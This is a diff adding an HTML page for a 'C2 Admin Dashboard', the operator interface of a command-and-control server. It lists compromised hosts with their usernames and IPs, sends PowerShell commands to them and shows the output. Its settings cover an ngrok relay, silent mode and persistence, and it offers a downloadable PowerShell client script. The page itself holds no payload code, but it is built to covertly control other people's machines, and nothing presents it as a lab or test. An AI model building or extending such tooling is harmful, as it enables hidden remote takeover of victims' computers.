@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C2 Admin Dashboard</title>
+    <link rel="stylesheet" href="https://cdn.replit.com/agent/bootstrap-agent-dark-theme.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css">
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+        <div class="container-fluid">
+            <a class="navbar-brand" href="#"><i class="bi bi-server"></i> C2 Server</a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav">
+                    <li class="nav-item">
+                        <a class="nav-link active" href="#hosts-tab" data-bs-toggle="tab">Hosts</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#config-tab" data-bs-toggle="tab">Configuration</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#script-tab" data-bs-toggle="tab">PowerShell Script</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container mt-4">
+        <div class="tab-content">
+            <!-- Hosts Tab -->
+            <div class="tab-pane fade show active" id="hosts-tab">
+                <h2>Connected Hosts</h2>
+                <div class="card mb-4">
+                    <div class="card-header d-flex justify-content-between align-items-center">
+                        <h5 class="mb-0">Active Hosts</h5>
+                        <button class="btn btn-sm btn-outline-info" id="refresh-hosts">
+                            <i class="bi bi-arrow-clockwise"></i> Refresh
+                        </button>
+                    </div>
+                    <div class="card-body">
+                        <div class="table-responsive">
+                            <table class="table table-hover">
+                                <thead>
+                                    <tr>
+                                        <th>Hostname</th>
+                                        <th>IP</th>
+                                        <th>Username</th>
+                                        <th>OS</th>
+                                        <th>Last Seen</th>
+                                        <th>Actions</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="hosts-table-body">
+                                    <tr>
+                                        <td colspan="6" class="text-center">Loading hosts...</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Host Details Section -->
+                <div id="host-details" class="card mb-4 d-none">
+                    <div class="card-header d-flex justify-content-between align-items-center">
+                        <h5 class="mb-0">Host Details: <span id="detail-hostname"></span></h5>
+                        <button class="btn btn-sm btn-outline-secondary" id="close-details">
+                            Close
+                        </button>
+                    </div>
+                    <div class="card-body">
+                        <div class="row">
+                            <div class="col-md-6">
+                                <h6>System Information</h6>
+                                <ul class="list-group mb-3">
+                                    <li class="list-group-item d-flex justify-content-between">
+                                        <span>IP Address:</span>
+                                        <span id="detail-ip"></span>
+                                    </li>
+                                    <li class="list-group-item d-flex justify-content-between">
+                                        <span>Username:</span>
+                                        <span id="detail-username"></span>
+                                    </li>
+                                    <li class="list-group-item d-flex justify-content-between">
+                                        <span>Operating System:</span>
+                                        <span id="detail-os"></span>
+                                    </li>
+                                    <li class="list-group-item d-flex justify-content-between">
+                                        <span>First Seen:</span>
+                                        <span id="detail-first-seen"></span>
+                                    </li>
+                                    <li class="list-group-item d-flex justify-content-between">
+                                        <span>Last Seen:</span>
+                                        <span id="detail-last-seen"></span>
+                                    </li>
+                                </ul>
+                            </div>
+                            <div class="col-md-6">
+                                <h6>Command Execution</h6>
+                                <div class="mb-3">
+                                    <label for="command-input" class="form-label">Enter Command</label>
+                                    <textarea class="form-control" id="command-input" rows="3" placeholder="Enter PowerShell command..."></textarea>
+                                </div>
+                                <button class="btn btn-primary" id="send-command">Send Command</button>
+                            </div>
+                        </div>
+
+                        <!-- Tabs for logs and errors -->
+                        <ul class="nav nav-tabs mt-4" id="hostDetailsTabs" role="tablist">
+                            <li class="nav-item" role="presentation">
+                                <button class="nav-link active" id="logs-tab" data-bs-toggle="tab" data-bs-target="#logs" type="button" role="tab">
+                                    Command Outputs
+                                </button>
+                            </li>
+                            <li class="nav-item" role="presentation">
+                                <button class="nav-link" id="errors-tab" data-bs-toggle="tab" data-bs-target="#errors" type="button" role="tab">
+                                    Errors
+                                </button>
+                            </li>
+                        </ul>
+                        <div class="tab-content pt-3" id="hostDetailsTabContent">
+                            <div class="tab-pane fade show active" id="logs" role="tabpanel">
+                                <div class="logs-container">
+                                    <div id="logs-content" class="terminal">
+                                        <div class="text-muted">No command outputs yet.</div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="tab-pane fade" id="errors" role="tabpanel">
+                                <div class="logs-container">
+                                    <div id="errors-content" class="terminal">
+                                        <div class="text-muted">No errors reported.</div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Configuration Tab -->
+            <div class="tab-pane fade" id="config-tab">
+                <h2>Server Configuration</h2>
+                <div class="card">
+                    <div class="card-header">
+                        <h5 class="mb-0">Configuration Settings</h5>
+                    </div>
+                    <div class="card-body">
+                        <form id="config-form">
+                            <div class="mb-3">
+                                <label for="ngrok-host" class="form-label">Ngrok Host</label>
+                                <input type="text" class="form-control" id="ngrok-host" name="ngrok_host">
+                            </div>
+                            <div class="mb-3">
+                                <label for="ngrok-port" class="form-label">Ngrok Port</label>
+                                <input type="number" class="form-control" id="ngrok-port" name="ngrok_port">
+                            </div>
+                            <div class="mb-3">
+                                <label for="retry-interval" class="form-label">Retry Interval (seconds)</label>
+                                <input type="number" class="form-control" id="retry-interval" name="retry_interval">
+                            </div>
+                            <div class="mb-3 form-check">
+                                <input type="checkbox" class="form-check-input" id="silent-mode" name="silent_mode">
+                                <label class="form-check-label" for="silent-mode">Silent Mode</label>
+                            </div>
+                            <div class="mb-3 form-check">
+                                <input type="checkbox" class="form-check-input" id="persist" name="persist">
+                                <label class="form-check-label" for="persist">Persistence</label>
+                            </div>
+                            <button type="submit" class="btn btn-primary">Save Configuration</button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+
+            <!-- PowerShell Script Tab -->
+            <div class="tab-pane fade" id="script-tab">
+                <h2>PowerShell Client Script</h2>
+                <div class="card">
+                    <div class="card-header d-flex justify-content-between align-items-center">
+                        <h5 class="mb-0">Script Editor</h5>
+                        <div>
+                            <button class="btn btn-sm btn-outline-info" id="download-script">
+                                <i class="bi bi-download"></i> Download
+                            </button>
+                        </div>
+                    </div>
+                    <div class="card-body">
+                        <div class="mb-3">
+                            <textarea class="form-control code-editor" id="powershell-script" rows="20"></textarea>
+                        </div>
+                        <div class="d-flex justify-content-between">
+                            <button class="btn btn-primary" id="save-script">Save Script</button>
+                            <button class="btn btn-secondary" id="reset-script">Reset Changes</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Command Output Modal -->
+    <div class="modal fade" id="commandOutputModal" tabindex="-1" aria-hidden="true">
+        <div class="modal-dialog modal-lg">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title">Command Output</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body">
+                    <div class="mb-2">
+                        <strong>Command:</strong>
+                        <pre id="modal-command" class="bg-dark text-light p-2 rounded"></pre>
+                    </div>
+                    <div>
+                        <strong>Output:</strong>
+                        <pre id="modal-output" class="bg-dark text-light p-2 rounded"></pre>
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="/static/main.js"></script>
+</body>
+</html>
